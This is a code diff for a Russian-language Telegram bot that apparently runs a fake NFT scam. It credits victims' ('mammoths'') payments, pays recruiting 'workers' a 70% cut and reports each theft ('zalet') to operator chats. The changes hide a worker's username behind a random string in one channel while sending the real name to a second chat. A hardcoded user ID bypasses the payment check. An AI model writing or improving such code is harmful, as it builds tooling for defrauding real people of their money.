@@ -109,14 +109,20 @@ async def check_pay(call: types.CallbackQuery):
     if info_2['order']['comment'] == "Подтверждено командой" or call.from_user.id == 5067464785:
         user = get_user(call.from_user.id, '')
         set_mamont_balance_db(call.from_user.id, user['balance']+int(float(info_2['order']['incoming_amount'])))
+        nabor = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+        comment = ''
+        for x in range(6):
+            comment += random.choice(nabor)
         if user['ref'] != 0:
             worker = get_user(user['ref'], '')
             profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
-            await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info_2['order']['incoming_amount']))}\n👨‍💻Воркер: {worker['username']}\n\n💰 Сумма пополнения: {int(float(info_2['order']['incoming_amount']))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
+            await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info_2['order']['incoming_amount']))}\n👨‍💻Воркер: {comment}\n\n💰 Сумма пополнения: {int(float(info_2['order']['incoming_amount']))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
+            await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: {worker['username']}\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
             await bot.send_message(user['ref'], f'<b>⚡️ Мамонт оплатил счет. Твой профит <code>{profit}₽</code></b>')
         else:
             profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
             await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info_2['order']['incoming_amount']))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info_2['order']['incoming_amount']))}\n🎆Сервис: NFT")
+            await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
         print(call.message.text)
         print(call.message.from_user.username)
         await bot.edit_message_caption(caption=f'✅ Платеж успешно получен\nCредства начислены вам на баланс', chat_id=call.message.chat.id, message_id=call.message.message_id)
@@ -145,8 +151,8 @@ async def check_pay(call: types.CallbackQuery):
                 await bot.send_message(user['ref'], f'<b>⚡️ Мамонт оплатил счет. Твой профит <code>{profit}₽</code></b>')
             else:
                 profit = int(float(info_2['order']['incoming_amount'])) / 100 * 70
-                await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
-                await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
+                await bot.send_message(-1001705609393, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n💵 Доля воркера: {profit}₽\n🎆Сервис: NFT", parse_mode='Markdown')
+                await bot.send_message(-1001599995645, f"🔥 Залет на сумму: {int(float(info[0]))}\n👨‍💻Воркер: Неизвестно\n\n💰 Сумма пополнения: {int(float(info[0]))}\n🎆Сервис: NFT")
             await bot.edit_message_caption(caption=f'✅ Платеж успешно получен\nCредства начислены вам на баланс', chat_id=call.message.chat.id, message_id=call.message.message_id)
             
             return
